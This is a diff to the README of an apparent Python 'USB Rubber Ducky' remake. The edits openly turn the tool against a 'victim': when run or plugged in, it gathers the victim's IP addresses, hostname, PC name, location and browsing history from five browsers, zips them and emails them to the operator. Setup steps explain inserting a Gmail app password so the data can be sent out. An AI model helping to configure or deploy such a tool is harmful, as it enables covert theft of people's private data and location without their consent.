@@ -2,19 +2,19 @@
 Remake Of The USB Rubber Ducky In Python With Way Better Features😎
 
 # What It Does:
-When You Execute It, It Will Send An Email To You (If You Follow The Instructions And Tutorials Below) With Your IP Addresses, IPv4 and IPv6, Your Hostname, Your PC's Name, Your Location, Your Town/City, Browsing History. Brave, Edge, Google Chrome, Firefox, Aaaand Opera And Compresses Them To Make Them Under 25 Megabytes Or So.
+When You/The Victim Execute/s It/Plugs In The Usb , It Will Send An Email To You (If You Follow The Instructions And Tutorials Below) With Your/The Victims IP Addresses, IPv4 and IPv6, Your/The Victims Hostname, Your/The Victims PC's Name, Your/The Victims Location, Your/The Victims Town/City, Browsing History. Brave, Edge, Google Chrome, Firefox, Aaaand Opera And Then Makes A Zip And Names It combined_data.zip And Compresses It To Make Them Under 25 Megabytes Or So.
 
 # NOTE: This Only Works With Gmail And Needs An Gmail App Password (AKA An SMTP Server API Key). Tutorial On How To Make One: https://www.youtube.com/watch?v=JDA3a8tEBlo, And Also This Repository Has Been Licensed With AGPL 3.0! So Pls Respect My Code.
 
 ![virus-usb-icon-isometric-style-vector](https://github.com/user-attachments/assets/bf2eb622-0e56-44c2-8af2-86d9b1b14b55)
 
-# Instuctions:
+# Instuctions/How To Make The USBLogger:
 
 You Need To Edit The Python Script For It To Send An Email To You.
 
 Step 1: Replace The * Your Gmail Email Address Here * With Your Email Address. (GMAIL)
 
-Step 2: Replace The * Your Gmail App Password Here * With Your Gmail App Password.
+Step 2: Replace The * Your Gmail App Password Here * With Your Gmail App Password AKA Your Gmails SMTP API Key.
 
 Step 3: Replace The * Your Gmail Email Address Here * On Line 177.
 
